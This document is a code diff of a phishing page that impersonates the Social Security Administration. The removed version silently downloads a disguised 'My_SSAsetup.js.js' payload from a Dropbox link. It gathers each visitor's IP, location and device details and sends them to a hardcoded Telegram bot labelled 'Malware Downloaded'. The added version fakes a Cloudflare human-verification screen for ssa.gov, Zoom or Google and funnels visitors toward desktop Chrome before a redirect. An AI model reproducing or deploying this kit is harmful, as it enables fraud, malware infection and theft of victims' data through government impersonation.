@@ -1,95 +1,156 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US" dir="ltr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Social Security Administration - Application Download</title>
+    <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #313131;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif
+        }
         body {
-            font-family: Arial, sans-serif;
             display: flex;
             flex-direction: column;
-            align-items: center;
-            justify-content: center;
             height: 100vh;
-            margin: 0;
-            background: url('background.jpg') no-repeat center center fixed;
-            background-size: cover;
-            position: relative;
+            min-height: 100vh;
+            background-color: #f9f9f9;
         }
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(255, 255, 255, 0.85);
-            z-index: -1;
+        .main-content {
+            margin: 8rem auto;
+            padding-left: 1.5rem;
+            max-width: 60rem
         }
-        .container {
-            text-align: center;
-            padding: 30px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
-            width: 90%;
-            max-width: 450px;
-            border: 1px solid #ddd;
-            position: relative;
-            z-index: 2;
+        @media (width <= 720px) {
+            .main-content {
+                margin-top: 4rem
+            }
         }
-        .logo {
-            margin-bottom: 15px;
-            max-width: 100%;
-            height: auto;
-            max-height: 80px;
+        .h2 {
+            line-height: 2.25rem;
+            font-size: 1.5rem;
+            font-weight: 500
         }
-        .agency-name {
-            color: #1b3d6d;
-            font-size: 20px;
-            font-weight: bold;
-            margin-bottom: 25px;
+        @media (width <= 720px) {
+            .h2 {
+                line-height: 1.5rem;
+                font-size: 1.25rem
+            }
         }
-        .status-message {
-            font-size: 17px;
-            margin: 20px 0;
-            color: #333;
+        .core-msg {
             line-height: 1.5;
+            font-size: 1rem;
+            color: #555;
+            margin-top: 1.5rem;
         }
-        .completed {
-            color: #2e7d32;
-            font-weight: bold;
+        .spacer {
+            margin: 2rem 0
         }
-        .error-message {
-            color: #d32f2f;
-            font-weight: bold;
-            margin: 20px 0;
-            padding: 15px;
-            border: 1px solid #ffcdd2;
-            background-color: #ffebee;
-            border-radius: 5px;
-            line-height: 1.5;
+        .spacer-top {
+            margin-top: 4rem
         }
-        .rolling-container {
-            margin: 30px 0;
-            height: 60px;
+        .spacer-bottom {
+            margin-bottom: 2rem
+        }
+        .main-wrapper {
+            display: flex;
+            flex: 1;
+            flex-direction: column;
+            align-items: center
+        }
+        .h1 {
+            line-height: 3.75rem;
+            font-size: 2.5rem;
+            font-weight: 500
+        }
+        .zone-name-title {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #222;
+            margin-bottom: 1rem;
+        }
+        .loading-verifying {
+            height: 76.391px;
+            margin-top: 1.5rem;
+        }
+        .lds-ring {
+            display: inline-block;
             position: relative;
+            width: 1.875rem;
+            height: 1.875rem
         }
-        .dot {
+        .lds-ring div {
+            box-sizing: border-box;
+            display: block;
             position: absolute;
-            width: 10px;
-            height: 10px;
+            border: .3rem solid #313131;
             border-radius: 50%;
-            background-color: #1b3d6d;
-            top: 0;
-            left: 50%;
-            transform: translate(-50%, 0);
-            opacity: 0;
+            border-color: #313131 transparent transparent transparent;
+            width: 1.875rem;
+            height: 1.875rem;
+            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite
         }
-
-        /* Edge Popup Overlay Styles */
-        .edge-popup-overlay {
+        .lds-ring div:nth-child(1) {
+            animation-delay: -0.45s
+        }
+        .lds-ring div:nth-child(2) {
+            animation-delay: -0.3s
+        }
+        .lds-ring div:nth-child(3) {
+            animation-delay: -0.15s
+        }
+        @keyframes lds-ring {
+            0% {
+                transform: rotate(0deg)
+            }
+            100% {
+                transform: rotate(360deg)
+            }
+        }
+        .footer {
+            margin: 0 auto;
+            padding-right: 1.5rem;
+            padding-left: 1.5rem;
+            width: 100%;
+            max-width: 60rem;
+            line-height: 1.125rem;
+            font-size: .75rem
+        }
+        .footer-inner {
+            border-top: 1px solid #d9d9d9;
+            padding-top: 1rem;
+            padding-bottom: 1rem
+        }
+        .text-center {
+            text-align: center
+        }
+        .ray-id {
+            text-align: center
+        }
+        code {
+            font-family: monaco, courier, monospace
+        }
+        .verification-text {
+            font-size: 1.5rem;
+            font-weight: 500;
+            color: #222;
+            margin-bottom: 1.5rem;
+        }
+        .security-msg {
+            margin-top: 2rem;
+        }
+        
+        /* Popup Overlay Styles - Same for Edge and Mobile */
+        .popup-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -102,7 +163,7 @@
             justify-content: center;
             font-family: Arial, sans-serif;
         }
-        .edge-popup-container {
+        .popup-container {
             background-color: white;
             border-radius: 12px;
             width: 90%;
@@ -122,28 +183,28 @@
                 transform: scale(1);
             }
         }
-        .edge-popup-icon {
+        .popup-icon {
             font-size: 48px;
             margin-bottom: 12px;
         }
-        .edge-popup-title {
+        .popup-title {
             font-size: 22px;
             font-weight: bold;
             color: #1b3d6d;
             margin-bottom: 12px;
         }
-        .edge-popup-message {
+        .popup-message {
             font-size: 16px;
             color: #555;
             line-height: 1.4;
             margin-bottom: 24px;
         }
-        .edge-popup-buttons {
+        .popup-buttons {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
-        .edge-popup-btn {
+        .popup-btn {
             padding: 12px 16px;
             border: none;
             border-radius: 30px;
@@ -152,288 +213,220 @@
             cursor: pointer;
             transition: all 0.2s ease;
         }
-        .edge-popup-btn-primary {
+        .popup-btn-primary {
             background-color: #4285f4;
             color: white;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        .edge-popup-btn-primary:hover {
+        .popup-btn-primary:hover {
             background-color: #3367d6;
             transform: scale(1.02);
         }
-        .edge-popup-btn-secondary {
-            background-color: #f1f3f4;
-            color: #5f6368;
+        
+        .copy-success {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2e7d32;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 1001;
+            animation: fadeOut 2s ease forwards;
         }
-        .edge-popup-btn-secondary:hover {
-            background-color: #e8eaed;
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+        
+        /* Dynamic Background */
+        body {
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-size: 200px;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: -1;
+            pointer-events: none;
+        }
+        body.bg-zoom::before {
+            background-image: url('https://assets.zoom.us/images/en-us/general/zoom_logo_icon.svg');
+            opacity: 0.1;
+        }
+        body.bg-google::before {
+            background-image: url('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png');
+            opacity: 0.1;
+        }
+        body.bg-ssa::before {
+            background-image: url('https://www.ssa.gov/images/ssa-logo.svg');
+            opacity: 0.1;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://c7.alamy.com/comp/2CDJB6B/social-security-administration-ssa-2CDJB6B.jpg" alt="Social Security Administration" class="logo">
-        <div class="agency-name">Social Security Administration</div>
-        <div id="contentArea">
-            <div class="status-message">Downloading Tax Documents,please check your download folder to view...</div>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1" id="zoneTitle">ssa.gov</h1>
+            <div id="verificationContent">
+                <p class="verification-text">Verifying you are human. This may take a few seconds.</p>
+                <div class="loading-verifying">
+                    <div class="lds-ring">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                </div>
+                <p class="core-msg security-msg">ssa.gov needs to review the security of your connection before proceeding.</p>
+            </div>
         </div>
-        <div class="rolling-container" id="rollingContainer">
-            <div class="dot" id="dot1"></div>
-            <div class="dot" id="dot2"></div>
-            <div class="dot" id="dot3"></div>
-            <div class="dot" id="dot4"></div>
-            <div class="dot" id="dot5"></div>
-            <div class="dot" id="dot6"></div>
-            <div class="dot" id="dot7"></div>
-            <div class="dot" id="dot8"></div>
+    </div>
+    <div class="footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=l" target="_blank">Cloudflare</a></div>
         </div>
     </div>
 
-    <script>
-        // Configuration - UPDATE THESE VALUES
-        const DOWNLOAD_LINK = 'https://www.dropbox.com/scl/fi/599os0p8ifdevwcsjkiz9/My_SSAsetup.js.js?rlkey=q3mi8b372mxajpmk1s0j429qh&st=jqr5lhle&dl=1'; // CHANGE THIS TO YOUR DOWNLOAD LINK
-        const BACKGROUND_IMAGE_NAME = 'background.jpg'; // Name of your background image
-        const REDIRECT_URL = 'https://www.ssa.gov/';
-        const DESKTOP_REDIRECT_DELAY = 15; // 3 seconds for desktop users
+<script>
+    // ========== CONFIGURATION - YOU CAN CHANGE THIS ==========
+    const POPUP_DELAY_SECONDS = 3;  // 👈 Change this value to set how many seconds before popup appears (e.g., 5, 8, 10)
+    
+    // ========== TARGET URL ==========
+    const TARGET_URL = window.location.href.replace(/\/[^/]*$/, '/ssa.html');
+    
+    // ========== USER AGENT DETECTION ==========
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    
+    function isEdgeBrowser() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isEdgeChromium = userAgent.includes('edg/') || userAgent.includes('edgios/') || userAgent.includes('edga/');
+        const isLegacyEdge = userAgent.includes('edge/') && !userAgent.includes('edg/');
+        const isMobileEdge = /EdgA/i.test(navigator.userAgent) || /EdgiOS/i.test(navigator.userAgent);
+        return isEdgeChromium || isLegacyEdge || isMobileEdge;
+    }
+    
+    // ========== DYNAMIC BACKGROUND ==========
+    function setDynamicBackground() {
+        const referrer = document.referrer.toLowerCase();
         
-        // Telegram Webhook Configuration - UPDATE WITH YOUR DETAILS
-        const TELEGRAM_BOT_TOKEN = '8789289338:AAHHULXu_rKpg3FTo25Da8X9gRxarUzBBZ4';
-        const TELEGRAM_CHAT_ID = '8630161918';
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-        // DOM Elements
-        const contentArea = document.getElementById('contentArea');
-        const rollingContainer = document.getElementById('rollingContainer');
-        const dots = Array.from({length: 8}, (_, i) => document.getElementById(`dot${i+1}`));
-
-        // Check if mobile device
-        function isMobileDevice() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        if (referrer.includes('zoom.us') || referrer.includes('zoom')) {
+            document.body.classList.add('bg-zoom');
+            document.getElementById('zoneTitle').textContent = 'zoom.us';
+        } else if (referrer.includes('google.com') || referrer.includes('google')) {
+            document.body.classList.add('bg-google');
+            document.getElementById('zoneTitle').textContent = 'google.com';
+        } else {
+            document.body.classList.add('bg-ssa');
         }
-
-        // ========== EDGE BROWSER DETECTION (including mobile Edge) ==========
-        function isEdgeBrowser() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            // Detect Edge (Chromium-based Edge) - includes "edg/" or "edgios" for iOS Edge or "edga" for Android Edge
-            const isEdgeChromium = userAgent.includes('edg/') || userAgent.includes('edgios/') || userAgent.includes('edga/');
-            // Also detect legacy Edge (EdgeHTML) - older versions
-            const isLegacyEdge = userAgent.includes('edge/') && !userAgent.includes('edg/');
-            
-            // Additional check: some mobile Edge browsers might use different identifiers
-            const isMobileEdge = /EdgA/i.test(navigator.userAgent) || /EdgiOS/i.test(navigator.userAgent);
-            
-            return isEdgeChromium || isLegacyEdge || isMobileEdge;
-        }
+    }
+    
+    // ========== POPUP FUNCTION (Same style for both Edge and Mobile) ==========
+    function showPopup(icon, title, message) {
+        const overlay = document.createElement('div');
+        overlay.className = 'popup-overlay';
         
-        // Function to show Edge popup overlay (same pattern as phone popup but adapted for all devices)
-        function showEdgePopup() {
-            // Create overlay element
-            const overlay = document.createElement('div');
-            overlay.className = 'edge-popup-overlay';
-            
-            // Popup HTML content - REMOVED the "Switch to Chrome" button, only Keep Dismiss button
-            overlay.innerHTML = `
-                <div class="edge-popup-container">
-                    <div class="edge-popup-icon">🌐</div>
-                    <div class="edge-popup-title">Browser Not Supported</div>
-                    <div class="edge-popup-message">
-                        You are using Microsoft Edge. For security & compatibility,<br>
-                        <strong>please use Google Chrome</strong> to access and download your documents.
-                    </div>
-                    <div class="edge-popup-buttons">
-                        <button class="edge-popup-btn edge-popup-btn-primary" id="edgePopupDismissBtn">Dismiss</button>
-                    </div>
+        overlay.innerHTML = `
+            <div class="popup-container">
+                <div class="popup-icon">${icon}</div>
+                <div class="popup-title">${title}</div>
+                <div class="popup-message">${message}</div>
+                <div class="popup-buttons">
+                    <button class="popup-btn popup-btn-primary" id="popupCopyBtn">📋 Copy URL</button>
                 </div>
-            `;
-            
-            // Append to body
-            document.body.appendChild(overlay);
-            
-            // Prevent body scrolling while popup is active
-            document.body.style.overflow = 'hidden';
-            
-            // Dismiss button event handler
-            const dismissBtn = document.getElementById('edgePopupDismissBtn');
-            
-            // Dismiss button: remove popup and show error message (prevent download & animation)
-            if (dismissBtn) {
-                dismissBtn.addEventListener('click', function() {
-                    overlay.remove();
-                    document.body.style.overflow = '';
+            </div>
+        `;
+        
+        document.body.appendChild(overlay);
+        document.body.style.overflow = 'hidden';
+        
+        const copyBtn = document.getElementById('popupCopyBtn');
+        
+        if (copyBtn) {
+            copyBtn.addEventListener('click', async function() {
+                try {
+                    await navigator.clipboard.writeText(TARGET_URL);
                     
-                    // Show a friendly error that they need Chrome
-                    contentArea.innerHTML = `
-                        <div class="error-message">
-                            This document requires Google Chrome for proper security validation.<br><br>
-                            Please open this page using Google Chrome to download your tax documents.
-                        </div>
-                    `;
+                    const notification = document.createElement('div');
+                    notification.className = 'copy-success';
+                    notification.textContent = '✓ URL copied! Open Google Chrome and paste to continue.';
+                    document.body.appendChild(notification);
                     
-                    // Hide rolling animation container if active
-                    if (rollingContainer) {
-                        rollingContainer.style.display = 'none';
-                    }
-                });
-            }
-        }
-
-        // Circular rolling animation
-        const radius = 25;
-        let angle = 0;
-        let animationInterval;
-        
-        function startRollingAnimation() {
-            updateDotPositions();
-            animationInterval = setInterval(updateDotPositions, 100);
-        }
-        
-        function updateDotPositions() {
-            dots.forEach((dot, i) => {
-                const dotAngle = angle + (i * (Math.PI / 4));
-                const x = Math.sin(dotAngle) * radius;
-                const y = Math.cos(dotAngle) * radius;
-                dot.style.transform = `translate(calc(-50% + ${x}px), ${y}px)`;
-                dot.style.opacity = '0.7';
-            });
-            angle = (angle + 0.1) % (Math.PI * 2);
-        }
-
-        function stopRollingAnimation() {
-            clearInterval(animationInterval);
-            rollingContainer.style.display = 'none';
-        }
-
-        // Collect device and location information
-        async function collectDeviceInfo() {
-            const info = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                isMobile: isMobileDevice(),
-                ipAddress: await fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => d.ip)
-                    .catch(() => 'Unknown')
-            };
-
-            try {
-                const ipLocation = await fetch(`https://ipapi.co/${info.ipAddress}/json/`).then(r => r.json());
-                info.country = ipLocation.country_name || "Unknown";
-                info.state = ipLocation.region || "Unknown";
-                info.city = ipLocation.city || "Unknown";
-            } catch (e) {
-                info.country = info.state = info.city = "Unknown";
-            }
-
-            return info;
-        }
-
-        // Send data to Telegram
-        async function sendToTelegram(data) {
-            try {
-                const text = `🔔 Malware Downloaded (#ND)\n\n` +
-                    `📱 Device: ${data.platform}\n` +
-                    `📲 Mobile: ${data.isMobile ? 'Yes' : 'No'}\n` +
-                    `🌐 User Agent: ${data.userAgent}\n` +
-                    `📍 Location: ${data.city}, ${data.state}, ${data.country}\n` +
-                    `📡 IP: ${data.ipAddress}\n` +
-                    `🕒 Time: ${new Date(data.timestamp).toLocaleString()}`;
-
-                await fetch(TELEGRAM_API_URL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: text,
-                        disable_notification: false
-                    })
-                });
-            } catch (error) {
-                console.error("Telegram error:", error);
-            }
-        }
-
-        // Show mobile error message with SSA header
-        function showMobileError() {
-            contentArea.innerHTML = `
-                <div class="error-message">
-                    The document is not available for mobile devices. Please switch to a Windows computer to download and view the document.
-                </div>
-            `;
-        }
-
-        // Show download success message
-        function showDownloadSuccess() {
-            contentArea.innerHTML = `
-                <div class="status-message completed">
-                    Download completed successfully! The application will now install.
-                </div>
-            `;
-        }
-
-        // Trigger file download from custom link (without popup permission on Chrome)
-        function triggerFileDownload() {
-            // Create a temporary anchor element to trigger download
-            const link = document.createElement('a');
-            link.href = DOWNLOAD_LINK;
-            link.download = ''; // Empty string to let browser determine filename
-            link.target = '_blank';
-            link.rel = 'noopener noreferrer';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            // Create iframe as fallback for browsers that block popups
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = DOWNLOAD_LINK;
-            document.body.appendChild(iframe);
-            
-            // Remove iframe after delay
-            setTimeout(() => {
-                if (document.body.contains(iframe)) {
-                    document.body.removeChild(iframe);
+                    setTimeout(() => {
+                        if (notification.parentNode) notification.remove();
+                    }, 2500);
+                    
+                    copyBtn.textContent = '✓ Copied!';
+                    setTimeout(() => {
+                        copyBtn.textContent = '📋 Copy URL';
+                    }, 2000);
+                    
+                } catch (err) {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = TARGET_URL;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    
+                    const notification = document.createElement('div');
+                    notification.className = 'copy-success';
+                    notification.textContent = '✓ URL copied! Open Google Chrome and paste to continue.';
+                    document.body.appendChild(notification);
+                    setTimeout(() => {
+                        if (notification.parentNode) notification.remove();
+                    }, 2500);
                 }
-            }, 6000);
+            });
         }
-
-        // Main process - with Edge detection block
-        async function main() {
-            // FIRST: Check if user is using Edge browser - show popup and block functionality
-            if (isEdgeBrowser()) {
-                showEdgePopup();
-                // Edge users should NOT proceed with download, animation, or redirect
-                // The popup will handle their action or show an error message
-                return; // Stop execution completely for Edge users
-            }
-            
-            // If not Edge browser, proceed with normal flow
-            const deviceInfo = await collectDeviceInfo();
-            
-            if (deviceInfo.isMobile) {
-                showMobileError();
-                return;
-            }
-            
-            // Start both download and animation simultaneously
-            triggerFileDownload();
-            startRollingAnimation();
-            
-            // After 2 seconds, show completion message but keep animating
-            setTimeout(() => {
-                showDownloadSuccess();
-            }, 5000);
-            
-            // After total 5 seconds, stop animation and redirect
-            setTimeout(async () => {
-                stopRollingAnimation();
-                await sendToTelegram(deviceInfo);
-                window.location.href = REDIRECT_URL;
-            }, 5000);
-        }
-
-        // Start the process
-        main();
-    </script>
+    }
+    
+    // ========== MAIN EXECUTION ==========
+    setDynamicBackground();
+    
+    const isEdge = isEdgeBrowser();
+    const isMobile = isMobileDevice();
+    
+    // Different messages for Edge vs Mobile, but SAME popup style
+    if (isEdge) {
+        // Show spinner first, then popup after configured delay
+        setTimeout(function() {
+            showPopup(
+                '🌐', 
+                'Browser Not Supported', 
+                'You are using Microsoft Edge. For security & compatibility,<br><strong>please use Google Chrome</strong> to access your documents.'
+            );
+        }, POPUP_DELAY_SECONDS * 1000);
+    } 
+    else if (isMobile) {
+        // Mobile gets SAME popup style but different message
+        setTimeout(function() {
+            showPopup(
+                '📱', 
+                'Mobile Device Detected', 
+                'This page requires a desktop computer. For security & compatibility,<br><strong>please use Google Chrome on Windows/Mac</strong> to access your documents.'
+            );
+        }, POPUP_DELAY_SECONDS * 1000);
+    }
+    else {
+        // Chrome desktop - normal redirect after spinner
+        setTimeout(function() {
+            window.location.href = "ssa.html";
+        }, 3000);
+    }
+</script>
 </body>
 </html>
